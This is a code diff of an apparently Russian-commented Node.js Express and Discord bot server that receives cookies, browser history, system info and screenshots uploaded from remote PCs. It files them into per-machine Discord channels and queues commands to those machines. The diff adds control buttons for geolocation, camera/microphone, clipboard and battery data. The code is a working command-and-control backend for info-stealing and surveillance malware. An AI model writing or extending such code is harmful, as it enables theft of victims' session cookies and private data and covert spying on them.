@@ -2,11 +2,6 @@ import express from "express";
 import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
 import http from "http";
 import crypto from "crypto";
-import path from "path";
-import { fileURLToPath } from "url";
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
 
 const app = express();
 app.use(express.json({ limit: "100mb" }));
@@ -85,6 +80,7 @@ async function getOrCreateLogChannel(guild) {
     return created;
 }
 
+// ---------- Кнопки управления ПК ----------
 function createControlButtons(pcId) {
     const safePcId = encodeURIComponent(pcId);
     return [new ActionRowBuilder().addComponents(
@@ -92,7 +88,13 @@ function createControlButtons(pcId) {
         new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Куки").setStyle(ButtonStyle.Success),
         new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("История").setStyle(ButtonStyle.Success),
         new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная").setStyle(ButtonStyle.Secondary),
-        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
+        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary),
+        // новые кнопки
+        new ButtonBuilder().setCustomId(`get_battery|${safePcId}`).setLabel("Батарея").setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder().setCustomId(`get_geolocation|${safePcId}`).setLabel("Геолокация").setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder().setCustomId(`get_media|${safePcId}`).setLabel("Камера/Микрофон").setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder().setCustomId(`get_clipboard|${safePcId}`).setLabel("Clipboard").setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder().setCustomId(`get_fonts|${safePcId}`).setLabel("Шрифты").setStyle(ButtonStyle.Secondary)
     )];
 }
 
@@ -105,6 +107,7 @@ bot.on("interactionCreate", async interaction => {
     await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
 });
 
+// ---------- Работа с файлами ----------
 function safeFileChunking(str, maxBytes) {
     const chunks = [];
     let i = 0;
@@ -140,7 +143,6 @@ app.post("/upload-pc", async (req, res) => {
         if (!finalChannel) finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
         channelByPC[pcId] = finalChannel.id;
 
-        // отправляем все данные
         if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);
         if (history) await sendJsonFile(finalChannel, `${channelName}-history`, history);
         if (systemInfo) await sendJsonFile(finalChannel, `${channelName}-system`, systemInfo);
@@ -165,6 +167,7 @@ app.post("/ping", (req, res) => {
     res.json({ commands });
 });
 
+// ---------- Сервер ----------
 const server = http.createServer(app);
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
